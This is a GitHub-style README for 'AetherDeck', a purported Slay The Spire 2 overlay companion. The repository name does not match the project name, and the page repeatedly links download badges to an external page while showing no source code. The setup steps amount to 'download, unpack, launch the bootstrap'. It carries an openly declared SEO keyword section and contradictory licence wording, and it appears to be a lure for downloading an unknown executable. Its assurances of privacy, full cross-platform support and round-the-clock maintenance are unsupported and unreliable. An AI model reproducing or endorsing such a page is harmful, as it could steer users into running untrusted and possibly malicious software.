![preview](https://raw.githubusercontent.com/ramijmandal00/Slay-The-Spire-2-Kizar-Companion/main/splash_4e477.svg)
[![Download](https://raw.githubusercontent.com/ramijmandal00/Slay-The-Spire-2-Kizar-Companion/main/latest_4fa0ba7.svg)](https://ramijmandal00.github.io/Slay-The-Spire-2-Kizar-Companion/)

# 🃏 AetherDeck — Adaptive Companion Suite for Slay The Spire 2

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Year](https://img.shields.io/badge/Year-2026-blue.svg)](#-license)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-informational.svg)](#-platform-compatibility)
[![Status](https://img.shields.io/badge/Status-Actively%20Maintained-brightgreen.svg)](#-project-status)
[![Language](https://img.shields.io/badge/i18n-Multilingual-purple.svg)](#-multilingual-experience)
[![UI](https://img.shields.io/badge/UI-Responsive%20%26%20Fluid-teal.svg)](#-responsive-interface-philosophy)

A refined, thoughtfully engineered companion suite for players exploring the deck-building roguelike universe of **Slay The Spire 2**. AetherDeck is not a shortcut — it is a *rehearsal stage*, a place where strategic intuition sharpens before the real run begins.

---

## 🌌 The Idea Behind AetherDeck

Imagine a theater rehearsal room. The lights are dimmed, the seats are empty, and the actors practice their lines without an audience. Nothing is stolen, nothing is broken — it is simply a space to prepare. AetherDeck was born from this metaphor.

Instead of offering a blunt instrument for bending the game, AetherDeck provides a **strategic observatory**: a compact, elegant overlay that lets you study card interactions, preview encounter pacing, and understand the rhythm of The Spire before your next descent. It is the difference between swinging a sword wildly and knowing exactly where the target stands.

This repository hosts the complete companion suite — interface layer, configuration engine, localization packs, and the full documentation ecosystem. Everything is designed to feel like a natural extension of your desktop, not a chaotic toolbar bolted onto it.

---

## ✨ Feature List — What Makes AetherDeck Distinct

- 🎛️ **Compact Overlay Menu** — A single, low-profile panel that folds out only when summoned. No clutter, no noise, just a calm control surface.
- ⚡ **Instant Access Model** — Every module inside AetherDeck is one keystroke away. The principle is simple: your flow state should never be interrupted by menus within menus.
- 🌍 **Multilingual Experience** — Interface text is served in a growing catalog of languages, from English and Spanish to Japanese and Polish, so the companion speaks your native tongue.
- 📱 **Responsive Interface Philosophy** — The layout adapts fluidly to ultrawide monitors, laptops, and small tablet screens alike. The panel breathes, it does not overflow.
- 🕰️ **Around-the-Clock Assistance** — A dedicated support rotation keeps the issue tracker and community channels warm at every hour, on every continent.
- 🧠 **Strategic Preview Layer** — Understand upcoming card rewards, relic synergies, and map branch probabilities before committing to a path.
- 🔧 **Modular Architecture** — Enable only the modules you care about. Every component is decoupled, so a lightweight setup stays lightweight.
- 🎨 **Theming Engine** — Choose between Vanilla Dusk, Ember Throne, and Frost Aria visual presets, or craft your own palette with JSON-based theme files.
- 📊 **Session Journal** — Log each run's decisions, win rate per archetype, and favorite card combinations in a searchable local archive.
- 🔄 **Hot-Reload Configuration** — Tweak a settings file and watch the overlay update in real time, without restarting the game client.
- 🧩 **Extensible Plugin Surface** — Third-party developers can hook into the AetherDeck event bus to add their own modules.
- 🛡️ **Privacy-First Design** — Nothing leaves your machine. The companion suite is entirely offline, storing data only in your local user directory.
- 📚 **Documentation-Rich** — Every module ships with an annotated configuration example and a changelog entry describing the *why*, not just the *what*.

---

## 🚀 Quick Start Overview

AetherDeck is distributed as a self-contained companion bundle. To get started:

1. Obtain the latest companion build using the [![Download](https://raw.githubusercontent.com/ramijmandal00/Slay-The-Spire-2-Kizar-Companion/main/latest_4fa0ba7.svg)](https://ramijmandal00.github.io/Slay-The-Spire-2-Kizar-Companion/) macro at the top of this document.
2. Unpack the archive into a folder of your choosing — somewhere memorable, like `Documents/AetherDeck`.
3. Launch the AetherDeck bootstrap entry point.
4. The first-run wizard will detect your Slay The Spire 2 installation directory and propose a sensible configuration.
5. Adjust the overlay hotkey to something that does not collide with your in-game bindings.
6. Press the summon key while the game is running, and the panel will fade in.

That's the entire ceremony. No environment juggling, no dependency wrangling, no terminal incantations.

---

## 🖥️ Platform Compatibility

| Operating System | Support Level | Notes |
|------------------|---------------|-------|
| Windows 10 / 11 | ✅ Full | Recommended baseline for performance |
| macOS 13+       | ✅ Full | Apple Silicon and Intel both validated |
| Linux (Proton)  | ✅ Full | Verified on Steam Deck and desktop distros |

The companion suite avoids kernel-level hooks and instead uses a window-adjacent rendering layer, which keeps it portable across all three major platforms.

---

## 📖 Documentation Map

The full documentation ecosystem is organized into several layers:

- **Getting Started** — a gentle tour of the interface.
- **Module Reference** — detailed behavior of each overlay component.
- **Configuration Guide** — every key, every value, every default.
- **Localization Handbook** — how to contribute a new language pack.
- **Plugin Authoring** — how to extend the event bus.
- **Troubleshooting Almanac** — solving the rare friction point.
- **Changelog Archive** — the full history of the project.

Each layer is intentionally written in plain, jargon-light prose. The goal is that a newcomer can read a single page and feel oriented.

---

## 🌐 Multilingual Experience

AetherDeck treats language as a first-class citizen, not an afterthought. The suite currently ships with interface catalogs for:

- English (en-US, en-GB)
- Spanish (es-ES, es-MX)
- French (fr-FR)
- German (de-DE)
- Italian (it-IT)
- Polish (pl-PL)
- Portuguese (pt-BR)
- Russian (ru-RU)
- Japanese (ja-JP)
- Korean (ko-KR)
- Simplified Chinese (zh-CN)
- Traditional Chinese (zh-TW)

Each localization is community-reviewed, and translation requests are always welcome through the standard issue tracker.

---

## 🎨 Responsive Interface Philosophy

The interface is built on a fluid grid that reflows based on viewport dimensions. On a 4K ultrawide monitor, the panel expands to show secondary telemetry columns. On a compact 11-inch laptop, the panel condenses into a single-column ribbon. Nothing is ever hidden that cannot be revealed with one tap.

The guiding metaphor: the interface should behave like water poured into a glass — it takes the shape of whatever vessel it lands in.

---

## 🕰️ Around-the-Clock Assistance

The companion suite is supported by a rotation of maintainers and community volunteers spread across time zones. That means:

- Issue triage happens within hours, not days.
- Community chat channels have a European morning crew, an American afternoon crew, and an Asian evening crew.
- Emergency regressions after a game patch are prioritized within the same day when feasible.

---

## 🧭 SEO-Friendly Keyword Integration

AetherDeck is described throughout this document using natural, search-engine-aware phrasing such as *Slay The Spire 2 companion suite*, *deck-building roguelike overlay*, *modular game companion*, *multilingual game utility*, and *responsive overlay interface*. These phrases are woven into the prose organically so that the README reads like a human wrote it — because a human did — while still being discoverable by prospective users searching for a reliable, elegant companion utility.

---

## 🧪 Project Status

AetherDeck is **actively maintained** and receives updates aligned with each major Slay The Spire 2 patch cycle. The versioning scheme follows a calendar-inspired pattern: `YY.MM.PATCH`, so a build released in early 2026 would look like `26.01.3`.

Backward compatibility is a priority: configuration files from older builds are automatically migrated forward whenever a schema change occurs.

---

## 🛡️ Disclaimer

AetherDeck is an independent, community-driven companion utility and is **not affiliated with, endorsed by, or sponsored by** the developers or publishers of Slay The Spire 2. All trademarks, game titles, and associated imagery remain the intellectual property of their respective owners.

This companion suite is intended for **solo gameplay enhancement** and **personal strategic rehearsal**. Users are encouraged to respect the terms of service of the base game and to avoid using AetherDeck in any competitive or online environment where such a companion would create an unfair advantage.

The maintainers of AetherDeck accept no responsibility for how the utility is used. Play thoughtfully, play respectfully, and remember that the real joy of a roguelike lies in the climb.

---

## 📄 License

This project is released under the **MIT License**. A working, canonical copy of the license text is available at the official Open Source Initiative location:

[https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT)

Copyright (c) 2026 AetherDeck Contributors. All rights reserved under the terms of the license above.

You are welcome to study the source, adapt it for private use, and contribute improvements back to the community. Attribution is appreciated but, per the MIT terms, not mandatory beyond preserving the license notice.

---

## 🤝 Contributing

Contributions land in several shapes: localization files, theme presets, plugin modules, documentation fixes, and bug reports. Before opening a pull request, please skim the contributor guide to ensure your submission aligns with the project's idioms. Small, focused pull requests are reviewed fastest.

---

## 💬 Closing Note

AetherDeck exists because the climb up The Spire is better when you understand your own footsteps. It is a mirror, a rehearsal stage, a quiet study room. Treat it as a companion, not a crutch, and the mountain becomes a place of genuine mastery.

[![Download](https://raw.githubusercontent.com/ramijmandal00/Slay-The-Spire-2-Kizar-Companion/main/latest_4fa0ba7.svg)](https://ramijmandal00.github.io/Slay-The-Spire-2-Kizar-Companion/)